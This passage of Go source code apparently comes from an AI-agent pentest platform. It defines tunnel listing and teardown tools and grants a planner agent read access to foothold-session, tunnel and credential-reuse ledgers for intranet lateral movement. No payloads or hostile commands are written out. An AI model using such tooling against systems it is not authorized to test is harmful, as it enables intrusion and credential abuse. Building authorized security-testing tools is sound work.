					row["reachable_ranges"] = json.RawMessage(r.ReachableRanges)
					row["reach_verified"] = r.ReachVerifiedAt != nil
				}
				// 实测范围与声明分字段：前者是「我试过」，后者是「我以为」。
				// 只在真探过时出现——没有观测就不给键，避免「空数组 = 确认不可达」。
				if r.ReachVerifiedAt != nil {
					row["reach_verified_at"] = r.ReachVerifiedAt.Format("2006-01-02 15:04:05")
					if len(r.ReachVerifiedRanges) > 0 && string(r.ReachVerifiedRanges) != "[]" {
						row["reach_verified_ranges"] = json.RawMessage(r.ReachVerifiedRanges)
					}
				}
				if len(r.DNSPolicy) > 0 && string(r.DNSPolicy) != "{}" {
					row["dns_policy"] = json.RawMessage(r.DNSPolicy)
				}
				if r.Error != "" {
					row["error"] = r.Error
				}
				out = append(out, row)
			}
			res := map[string]any{"tunnels": out, "count": len(out)}
			if routes != nil {
				res["routing"] = "按目标 host 逐请求选路（传输层行为，agent 不需要干预）：未证明的 host 会在各条隧道间轮换，" +
					"成功后粘住；proven_host_count 只表示「这条隧道已经成功承载过几个 host」，" +
					"**不是可达范围，也不是能力边界**——没被计入的 host 照样可以打，只是还没试过。"
			}
			return jsonResult(res)
		},
	})
}

// tunnelTeardownTool 回收隧道（四件套之受管回收）。
func (s *Server) tunnelTeardownTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "tunnel_teardown",
		Description: "【隧道四件套 4/4】回收一条隧道：经会话杀目标侧 client 进程（查远端、核对命令行防误杀）→ " +
			"杀平台侧 server → 删 stage 投递条目 → 删 authfile → 台账标 stopped。隧道用完必须调这个；" +
			"不要让隧道裸奔，也不要用裸 Bash 自己杀/起隧道进程。",
		Schema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"tunnel_id": map[string]any{"type": "integer", "description": "tunnel_deploy/tunnel_list 返回的隧道 id"},
			},
			"required": []any{"tunnel_id"},
		},
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				TunnelID int64 `json:"tunnel_id"`
			}
			_ = json.Unmarshal(in, &a)
			if a.TunnelID <= 0 {
				return actool.Errorf("tunnel_id 必填且 > 0"), nil
			}
			if err := s.authorizeTunnel(ctx, a.TunnelID); err != nil {
				return actool.Errorf(err.Error()), nil
			}
			// 级联回收（cascade.go）：先拆经它转发的子隧道链，再拆它自己——
			// 父先死子就成了杀不动的悬空远端进程。返回里把级联拆掉的子隧道
			// 一并列出，让调用方知道「拆一条」实际回收了几条。
			children, _ := s.tunnels.ChildrenOf(ctx, a.TunnelID)
			cascadeIDs := []int64{}
			for _, c := range children {
				if c != nil && c.State != db.TunnelStopped {
					cascadeIDs = append(cascadeIDs, c.ID)
				}
			}
			if err := s.tunnels.TeardownCascade(ctx, a.TunnelID); err != nil {
				return actool.Errorf("回收失败：" + err.Error()), nil
			}
			riTD := agent.RunInfoFrom(ctx)
			s.noteTunnelTornDown(riTD.TaskID, a.TunnelID)
			out := map[string]any{"tunnel_id": a.TunnelID, "state": db.TunnelStopped}
			if len(cascadeIDs) > 0 {
				out["cascade_torn_down"] = cascadeIDs
				out["note"] = "该隧道是多级链路的父隧道，以下子隧道已级联回收（依赖逆序）"
				for _, cid := range cascadeIDs {
					s.noteTunnelTornDown(riTD.TaskID, cid)
				}
			}
			return jsonResult(out)
		},
	})
}

// plannerReadableIntranetTools 是 planner 可以安全持有的内网只读工具。
// planner 是「读态势、派意图」的角色，给它写类内网工具会破坏职责边界
// （它不该自己 register_session / tunnel_deploy）。但只读三件套必须给：
// 否则它只能从 fact 文本间接推断内网状态，看不到隧道是否 alive、有没有可复用
// 凭据——这正是它反复派「再建隧道」重复意图的根因。
var plannerReadableIntranetTools = map[string]bool{
	"tunnel_list":           true, // 隧道台账（id/state/error）
	"session_list":          true, // 立足点会话台账（id/kind/host/status/last_beat）
	"list_credentials":      true, // 凭据脱敏列表
	"credential_reuse_plan": true, // 凭据 × 资产的复用建议
}

// toolAgentBindings 返回某内网工具应绑定的 agent 集合。写类工具只给 worker；
// 只读三件套额外给 planner。
func toolAgentBindings(toolName string) []string {
	if plannerReadableIntranetTools[toolName] {
		return []string{"worker", "planner"}
	}
	return []string{"worker"}
}

// seedTunnelTools 把隧道四工具 seed 进 tools 表、默认绑定 worker
// （与 sessionTools 同一套 SeedTool 首插入语义：老库的用户编辑不被覆盖）。
// 只读的 tunnel_list 额外绑 planner（见 plannerReadableIntranetTools）。
func (s *Server) seedTunnelTools() {
	if s.tunnels == nil {
		return
	}
	for _, t := range s.tunnelTools() {
		schema, _ := json.Marshal(t.InputSchema())
		agents, _ := json.Marshal(toolAgentBindings(t.Name()))
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, agents); err != nil {
			log.Printf("[tools] seed %s 失败： %v", t.Name(), err)
		}
	}
}

// migrateIntranetPlannerBindings 给已存在的库补齐 planner 绑定。
//
// 为什么需要迁移：SeedTool 是「首插入」语义（ON CONFLICT DO NOTHING），已经
// 跑过旧版本的库不会因为改了代码里的默认 agents 而更新。不加这一步，老库的
// planner 永远拿不到 tunnel_list / list_credentials / credential_reuse_plan，
// 内网态势投影再全也没用（它看不到明细）。
//
// AddAgentToToolBinding 自带 `NOT (agents ? $1)` 幂等保护，重复执行安全。
func (s *Server) migrateIntranetPlannerBindings() {
	pg := s.m.PG()
	if pg == nil {
		return
	}
	keys := make([]string, 0, len(plannerReadableIntranetTools))
	for k := range plannerReadableIntranetTools {
		keys = append(keys, k)
	}
	if err := pg.AddAgentToToolBinding("planner", keys); err != nil {
		log.Printf("[tools] planner 内网只读工具补绑失败: %v", err)
		return
	}
	log.Printf("[tools] planner 内网只读工具已就绪: %v", keys)
}
